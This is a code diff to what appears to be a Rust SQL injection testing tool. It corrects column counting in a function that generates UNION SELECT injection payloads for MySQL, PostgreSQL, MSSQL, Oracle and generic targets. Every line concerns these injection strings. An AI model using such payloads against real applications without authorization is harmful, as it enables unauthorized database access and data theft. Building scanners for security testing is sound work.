@@ -22,18 +22,28 @@ pub fn union_payloads_for(dbms: Option<&str>, columns: usize) -> Vec<UnionPayloa
         Some("oracle") => " --",
         _ => " -- -",
     };
+    // Second variant uses NULL as first column then cols-1 placeholders to keep total = columns
+    let cols_null = if columns <= 1 {
+        "NULL".to_owned()
+    } else {
+        let tail = (1..columns)
+            .map(|i| i.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        format!("NULL,{tail}")
+    };
     let base = match dbms {
         Some("mysql") => vec![
             (format!("' UNION SELECT {cols}{comment}"), "mysql"),
-            (format!("' UNION SELECT NULL,{cols}{comment}"), "mysql"),
+            (format!("' UNION SELECT {cols_null}{comment}"), "mysql"),
         ],
         Some("postgres") => vec![
             (format!("' UNION SELECT {cols}{comment}"), "postgres"),
-            (format!("' UNION SELECT NULL,{cols}{comment}"), "postgres"),
+            (format!("' UNION SELECT {cols_null}{comment}"), "postgres"),
         ],
         Some("mssql") => vec![
             (format!("' UNION SELECT {cols}{comment}"), "mssql"),
-            (format!("' UNION SELECT NULL,{cols}{comment}"), "mssql"),
+            (format!("' UNION SELECT {cols_null}{comment}"), "mssql"),
         ],
         Some("oracle") => vec![
             (
@@ -41,13 +51,13 @@ pub fn union_payloads_for(dbms: Option<&str>, columns: usize) -> Vec<UnionPayloa
                 "oracle",
             ),
             (
-                format!("' UNION SELECT NULL,{cols} FROM dual{comment}"),
+                format!("' UNION SELECT {cols_null} FROM dual{comment}"),
                 "oracle",
             ),
         ],
         _ => vec![
             (format!("' UNION SELECT {cols}{comment}"), "generic"),
-            (format!("' UNION SELECT NULL,{cols}{comment}"), "generic"),
+            (format!("' UNION SELECT {cols_null}{comment}"), "generic"),
             (format!("\" UNION SELECT {cols}{comment}"), "generic"),
         ],
     };
